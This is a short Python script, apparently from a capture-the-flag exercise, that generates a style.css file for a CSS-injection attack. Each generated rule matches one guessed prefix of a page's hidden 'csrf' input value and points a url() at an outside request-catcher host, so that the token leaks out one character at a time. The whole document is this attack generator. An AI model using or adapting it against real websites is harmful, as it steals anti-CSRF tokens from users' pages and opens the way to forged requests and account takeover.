import string

prefix = ""
css = ""

for c in filter(str.isalnum, string.printable):
    payload = f"{prefix}{c}"
    css += f"""
[name="csrf"][value^="{payload}"] {{
    --value: url("https://toto.requestcatcher.com/{payload}")
}}
"""

with open("style.css", "w") as f:
    f.write(css)
